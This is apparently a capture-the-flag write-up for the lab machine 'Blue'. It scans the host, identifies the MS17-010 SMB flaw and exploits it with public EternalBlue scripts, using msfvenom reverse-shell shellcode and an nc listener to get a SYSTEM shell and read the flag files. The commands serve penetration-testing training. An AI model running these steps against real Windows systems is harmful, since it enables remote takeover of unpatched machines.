# Blue @ 10.10.10.40

## Enumeration

A port scan with OS detection and script scanning reveals open ports for SMB and RPC, and shows us that the operation system is Windows 7 Prof SP1.

```bash
$ sudo nmap -v -A 10.10.10.40
...
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
...
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
...
```

Use the smb-vuln scripts of nmap to check for SMB vulnerabilities

```bash
$ nmap -v -p139,445 --script "smb-vuln-*" 10.10.10.40
...
Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
...
```

## Exploitation

The system seems to be vulnerable for MS17-010. This can be easily exploited with metasploit (use exploit/smb/ms17_010_eternalblue). But there are also some other great exploit scripts to be found on GitHub, like https://github.com/helviojunior/MS17-010. Note that there are a lot of variants available, some work, some don't.

```bash
$ git clone https://github.com/helviojunior/MS17-010.git
Cloning into 'MS17-010'...
$ cd MS17-010
```

First try the automatic exploit

```bash
$ python zzz_exploit.py 10.10.10.40 
Target OS: Windows 7 Professional 7601 Service Pack 1
Not found accessible named pipe
Done
```

No success, next step is to try the manual version in three steps:

1. Compile kernel code
2. Generate shell binaries.
3. Merge binaries into one file.
4. Start listener and run exploit

```bash
$ cd shellcode

# Compile kernel code
$ nasm -f bin eternalblue_kshellcode_x64.asm -o sc_x64_kernel.bin
$ nasm -f bin eternalblue_kshellcode_x86.asm -o sc_x86_kernel.bin

# Create shellcode
$ msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=10.10.14.16 LPORT=4444
$ msfvenom -p windows/shell_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=10.10.14.16 LPORT=4444

# Merge
$ cat sc_x64_kernel.bin sc_x64_msf.bin > sc_x64.bin
$ cat sc_x86_kernel.bin sc_x86_msf.bin > sc_x86.bin
$ python eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin

# Start listener in second terminal
$ nc -nlvp 4444

# Run exploit
$ cd..
$ python eternalblue_exploit7.py 10.10.10.40 shellcode/sc_all.bin 40
shellcode size: 2203
numGroomConn: 40
Target OS: Windows 7 Professional 7601 Service Pack 1
SMB1 session setup allocate nonpaged pool success
SMB1 session setup allocate nonpaged pool success
good response status: INVALID_PARAMETER
done
```

The groom number might need some fine tuning, in this case 40 seems to work

```bash
$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.10.40] 49158
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```

As we are already system, both user.txt and root.txt are accessible.

```cmd
C:\> type C:\Users\haris\Desktop\user.txt
C:\> type C:\Users\Administrator\Desktop\root.txt
```